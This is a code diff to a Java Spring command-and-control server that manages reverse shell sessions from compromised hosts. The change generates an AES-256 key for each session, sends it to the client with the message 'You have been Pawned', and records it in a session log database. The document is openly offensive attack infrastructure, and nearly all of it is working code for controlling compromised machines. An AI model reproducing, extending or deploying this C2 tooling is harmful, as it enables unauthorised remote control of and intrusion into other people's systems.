@@ -11,6 +11,7 @@ import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
 import com.mtattab.c2cServer.util.ConnectionManager;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
+import com.mtattab.c2cServer.util.EncryptionUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -35,6 +36,7 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
     public void addActiveSession(WebSocketSession session, TextMessage message){
         if (!ConnectionManager.activeReverseShellSessions.contains(session)){
             SessionLogEntity sessionLogEntity = logSessionInDb(session, message);
+            sendIntialMessage(session);
             activeSessionsObservable.addReverseShellSession(session, sessionLogEntity);
 
         }
@@ -57,7 +59,6 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
                     .sessionId(session.getId())
                     .sessionLocalAddress(Objects.requireNonNull(session.getLocalAddress()).toString())
                     .sessionRemoteAddress(Objects.requireNonNull(session.getRemoteAddress()).toString())
-
                     .sessionCreatedAt(Timestamp.valueOf(LocalDateTime.now()))
                     .hasFiles("N")
                     .build();
@@ -124,7 +125,7 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
         return false;
     }
 
-    public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
+    public void handleReverseShellClient(WebSocketSession session, TextMessage message) {
         String clientMessage = message.getPayload();
         if (SocketUtil.keepAliveHandle(message)){
             return;
@@ -167,13 +168,20 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 
 
     public void sendIntialMessage(WebSocketSession session){
+        String encryptionAes256Key = EncryptionUtil.bytesToHex(EncryptionUtil.generateAes256Key().getEncoded());
+        String sessionId = session.getId();
         SocketUtil.sendMessage(session, new TextMessage(
                 DataManipulationUtil.convertObjectToJson(InitialConnectionMessageModel.builder()
-                        .sessionId(session.getId())
+                        .sessionId(sessionId)
                         .initialMessage("You have been Pawned")
+                        .aes256Key(encryptionAes256Key)
                         .build())
 
         ));
+
+        sessionLogRepository.updateSessionToIncludeEncryptionKey(encryptionAes256Key, sessionId);
+
+
     }
 
 
